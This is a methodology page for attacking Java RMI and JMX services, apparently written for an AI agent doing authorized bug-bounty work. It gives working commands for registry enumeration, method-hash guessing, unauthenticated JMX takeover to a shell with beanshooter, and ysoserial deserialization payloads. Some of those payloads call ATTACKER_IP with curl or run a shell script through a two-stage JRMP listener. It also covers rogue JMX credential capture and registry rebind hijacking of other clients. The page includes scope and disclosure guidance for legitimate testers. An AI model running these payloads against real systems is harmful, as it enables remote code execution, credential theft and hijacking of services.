---
technology: "Java RMI"
kind: bug-bounty-methodology
audience: ai-agent
version: 1.0
family: network-services
evidence: "4 evidence files (see ../internal coverage ledger) — thin unit per standing rule; the evidence supplies registry invocation, JMX takeover, and listener-feeding chains; upstream supplies protocol and tool model"
provenance: "field-mined from 4 engagements (see ../internal coverage ledger) + upstream-verified: Oracle rmiregistry tool reference (1099 default, Naming/LocateRegistry semantics), frohoff/ysoserial README payload table (JRMPClient/JRMPListener presence; Spring bean-factory gadget NOT stock), qtc-de/beanshooter README (enum/standard/tonka/serial/brute/stager usage and output), nmap rmi-vuln-classloader NSE docs, Metasploit auxiliary/gather/java_rmi_registry + related java_rmi_server/java_jmx_server module pages. Accessed 2026-11-12. Wave 4 HT enrichment 2026-11-13: 1b version framing (JEP 320 / JEP 407 removals verified against the OpenJDK JEP pages; port conventions) and 2b remote-method-guesser coverage (actions grounded against the rmg README and the tools-vault rmg note; CVE-2019-2684 verified against NVD — Oracle Java SE RMI, 7u211/8u202/11.0.2/12) rewritten from HackTricks (src/network-services-pentesting/1099-pentesting-java-rmi.md), CC BY-NC 4.0, accessed 2026-11-13."
---

Companion page: [[java-rmi|Java RMI overview]] — what the protocol is and where you will meet it. Tool reference notes live in the separate tools vault; Appendix A names the relevant tools in prose.

# Java RMI Bug Bounty Methodology

**Scope:** the RMI/JRMP serving surface — rmiregistry endpoints (1099 et al.), exported remote objects, JMX connectors (RMI and JMXMP), and Java-serialization delivery over RMI channels. **Out of scope:** HTTP-delivered Java deserialization in web apps (the OFBiz-class lane belongs there), LDAP/JNDI endpoints (ldap unit), the applications exposed THROUGH RMI once invoked.

**Authorization:** presume written permission. Deserialization payloads are code execution by definition — build and detonate only what the engagement scope allows; prefer enumeration + benign invocations (a `String` echo, a canary DNS name) to prove reachability before any gadget. An RMI listener you host is attacker infrastructure: scope it like C2.

## Decision tree (one screen)

1. Port speaks JRMP (nmap `java-rmi`/`rmiregistry`, raw handshake) → Phase 1.
2. Registry responds → `list()` bound names → Phase 2 (enumeration) → per-name stub → Phase 3 (invocation).
3. `jmxrmi` in the names / JMX-looking connector → Phase 4 (beanshooter JMX attack).
4. Remote objects deserialize args → Phase 5 (ysoserial delivery) or host listener → Phase 6 (JRMP two-stage).
5. Registry accepts rebind → Phase 3b (client-hijack primitive; report, don't weaponize without sign-off).

## Phase 1 — Fingerprinting

```bash
nmap -sV -p 1090,1098,1099,8980,9002,2222 198.51.100.20     # service: java-rmi / rmiregistry
nmap --script=rmi-vuln-classloader -p 1099 198.51.100.20    # default-config remote class loading → RCE
```

`rmi-vuln-classloader` VULNERABLE output = registry accepts remote codebase class loading (nmap ports 1098/1099/1090/8901-8903). Manual handshake: an RMI endpoint answers a JRMP `JRMI` magic exchange; Metasploit's `auxiliary/gather/java_rmi_registry` enumerates bound names + looks up each remote reference (related scanners: `auxiliary/scanner/misc/java_rmi_server`, `auxiliary/scanner/misc/java_jmx_server`). Do not trust the port number alone.

**1b. Version framing that gates the whole hunt.** RMI-IIOP left the platform in Java SE 11 (JEP 320 removed `java.corba` and with it `javax.rmi`/RMI-IIOP support); the Activation system and its `rmid` daemon left in JDK 17 (JEP 407 — the rest of RMI stays). Seeing 1098 or activator-shaped behavior therefore means a legacy runtime or a third-party app server — BOTH remain in scope, but the JDK above the process tells you which of the well-known components can even exist. Port conventions beyond 1099 worth scanning on Java-heavy hosts: 1090, 1199, 4443-4446, 8999-9010, 9999. TLS-wrapped RMI (`ssl/java-rmi` in nmap) is often misidentified — treat any unknown TLS service on those ports as RMI until probed with protocol-aware tooling.

## Phase 2 — Registry enumeration

```java
Registry reg = LocateRegistry.getRegistry("registry.example.com", 9002);
for (String name : reg.list()) System.out.println(name);   // every bound service
Remote stub = reg.lookup("FileService");                   // stub → interface + endpoint port
```

Observed: the registry on 9002 exposed `FileService`; the exploit class did `LocateRegistry.getRegistry(...)`, `registry.lookup("FileService")` — and later `registry.rebind("QuarantineService", stub)` to implant its own service. Enumeration output drives everything: interface names tell you what to implement, stub data reveals the real object port (export ≠ registry port — rescan it).

**2b. remote-method-guesser (`rmg`) — the whole arc in one tool.** Before writing a custom client (Phase 3), run the scanner that wraps registry enumeration, configuration checks, method guessing, and payload delivery:

```bash
rmg enum 198.51.100.20 9010          # one shot: bound names + classes + endpoints + ObjIDs,
                                      # codebase + String-unmarshalling + useCodebaseOnly posture,
                                      # Security Manager + JEP 290 filter status (registry AND DGC),
                                      # registry localhost-bypass probe (CVE-2019-2684),
                                      # registry JEP-290 bypass probe (An Trinh gadget), activator check
rmg guess 198.51.100.20 9010         # brute-force method hashes from bundled wordlists (rmg's own
                                      # + rmiscout's); skips zero-arg methods by default (--zero-arg
                                      # enables; custom lists via --wordlist-file)
rmg call 198.51.100.20 9010 '"id"' --bound-name <name> --signature "String execute(String dummy)"
rmg serial 198.51.100.20 9010 CommonsCollections6 'curl http://ATTACKER_IP:8000/pwned' --component reg
                                      # --component: reg / dgc / act, or a bound name for app objects
rmg objid '[55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]'   # decodes the ObjID; the embedded
                                      # UID timestamp estimates when the object was exported
rmg known javax.management.remote.rmi.RMIServerImpl_Stub          # known-class DB: JMX, methods, vulns
rmg scan 198.51.100.20               # ~100 common RMI ports; prints Registry/Activator/DGC per hit
rmg listen 0.0.0.0 4444 CommonsCollections6 '<cmd>'               # JRMPListener wrapper (Phase 6)
rmg roguejmx 0.0.0.0 4444            # rogue JMX listener to capture JMX credentials
```

The three checks that change your plan: **`enum`'s CVE-2019-2684 probe** (Oracle Java SE RMI bug, 7u211/8u202/11.0.2/12 era — the registry's localhost restriction is bypassable, so REMOTE `bind`/`unbind`/`rebind` become possible; treat the rebind-hijack primitive of Phase 3 as remotely reachable on vulnerable JDKs); **the registry JEP-290 bypass probe** (the An Trinh gadget class bypasses registry deserialization filters where the runtime is vulnerable — `serial` against `reg` then beats a "JEP 290 installed" verdict); and **`guess`** — RMI has no remote reflection, but method-hash brute force from wordlists recovers callable signatures (`String execute(String)`, `void logMessage(int, String)`) that Phase 3's hand-written client would otherwise need client jars for. Tool labels are hypotheses from response behavior — verify against the exact runtime before reporting. Alternatives: rmiscout (BishopFox; method guessing with its own wordlist), BaRMIe (older enumeration + deserialization checks).

## Phase 3 — Remote object invocation (write the client)

When the service is a custom application object (no JMX):

1. Recover the remote interface: decompile client jars shipped with the product, or infer from server-side source once readable (observed: an exploit class implemented the `FileService` interface and invoked its methods directly — method `rebind(QuarantineConfiguration)` with `new File("/dev/shm/leak/")` args, i.e. real business methods with attacker-chosen parameters).
2. `javac` a client against the interface, `lookup()` the stub, invoke methods: benign first (`toString`-class), then the business methods with your data (path traversal in `File` args, privilege functions the UI never exposed).
3. Argument types matter: parameters are serialized to the server — anything passing through a `readObject` is Phase 5 territory.

Registry write primitive: `rebind(name, yourStub)` succeeds when the registry accepts it (observed in the field) — that is a client-hijack finding (other clients will `lookup()` YOUR object); report it, and weaponize only with explicit scope.

## Phase 4 — JMX attacks (beanshooter)

JMX connector `jmxrmi` (or JMXMP) without authentication:

```bash
java -jar beanshooter.jar enum 198.51.100.20 1090            # auth? SASL profile? non-default MBeans? tomcat users?
java -jar beanshooter.jar standard 198.51.100.20 1090 tonka  # deploy via StandardMBean (no outbound needed)
java -jar beanshooter.jar tonka shell 198.51.100.20 1090     # command shell through the TonkaBean
```

Observed: `2222/tcp open java-rmi`; enum showed `jmxrmi` "does not require authentication"; standard+tonka produced a shell. beanshooter's `enum` also lists MBeans and Tomcat users; `serial` performs ysoserial-backed deserialization (pre/post-auth); `brute` covers SASL credentials; `stager` serves MBeans over HTTP for MLet deployment. Tomcat variant (observed): the manager's text/JMX interfaces are HTTP-exposed JMX documented as "intended for tools" and CSRF-exempt — treat their URLs as an RMI-alternative delivery lane.

## Phase 5 — Deserialization via RMI (ysoserial)

Method arguments deserialize server-side; deliver a gadget:

```bash
java -jar ysoserial.jar CommonsBeanutils1 'curl http://ATTACKER_IP/dns-canary' > payload.bin
# feed payload.bin as the serialized argument to any invoked method (or registry operation)
```

Gadget choice = target classpath, not target CVE: CommonsCollections* need commons-collections on the server; Spring gadgets need Spring. JEP 290 filters on modern JDKs block many first-stage gadgets at the registry — try application-object endpoints (they often run unfiltered) and downgrade claims accordingly. URLDNS is the safe probe (DNS-only, no code exec) for "does it deserialize at all".

## Phase 6 — Attacker-side JRMP listener (two-stage)

Make the TARGET connect to YOU and deserialize what you serve:

```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'bash -c /tmp/shell.sh'
java -jar ysoserial.jar JRMPClient 'ATTACKER_IP:1099' > connect-back.bin   # delivered via Phase 5 sink
```

Observed: docker-built ysoserial ran the JRMP listener on 1099; the target was fed a gadget causing an outbound `rmi://ATTACKER_IP/test` fetch (Spring bean-factory `<shareable-resource>` XML injection), and the listener answered with the second-stage payload. Note provenance: that Spring bean-factory gadget came from an extended build — stock ysoserial's payload list does not include it; verify your jar actually contains a gadget before betting a delivery window on it.

## Disclosure notes

- Separate findings: (a) unauthenticated registry enumeration (info), (b) invocable business methods (app-specific impact), (c) JMX no-auth (RCE-equivalent, name the missing `com.sun.management.jmxremote.authenticate`), (d) successful gadget RCE (state gadget + classpath evidence).
- Name JVM flags in evidence where visible (`ps` output): `useCodebaseOnly=false`-class configurations and `authenticate=false` are config findings even before exploitation.
- Deserialization reports must state the JEP-290 posture honestly: "blocked at registry, accepted at application endpoint" is a different severity than blanket RCE.

## Appendix A — Tool mapping (prose)

- **nmap** (`-sV`, `rmi-vuln-classloader` NSE) — JRMP service detection and the classloader RCE check.
- **Metasploit** — `auxiliary/gather/java_rmi_registry` (bound-name enumeration), `auxiliary/scanner/misc/java_rmi_server`, `auxiliary/scanner/misc/java_jmx_server`, `exploit/multi/misc/java_rmi_server`.
- **ysoserial** — gadget generation (`CommonsBeanutils1`, `CommonsCollections6`, `URLDNS` probe, `JRMPClient`) and `ysoserial.exploit.JRMPListener` two-stage listener.
- **beanshooter** — JMX enumeration and takeover: `enum`, `standard`, `tonka shell`, `serial`, `brute`, `stager` (MBean ops: tonka, mlet, tomcat, hotspot, diagnostic, recorder).
- **remote-method-guesser (`rmg`)** — the RMI generalist (Phase 2b): `enum`, `guess`, `call`, `serial --component`, `objid`, `known`, `scan`, `listen`, `roguejmx`; rmiscout (BishopFox) and BaRMIe are the alternatives for method guessing and legacy checks.
- **javac / a Java IDE** — writing the custom client (Phase 3) against recovered remote interfaces.
- **Burp Suite** — for the HTTP-fronted JMX/text-interface variant (Tomcat manager lanes).
- **tcpdump / Wireshark** — JRMP traffic dissection when reconstructing method signatures from captures.
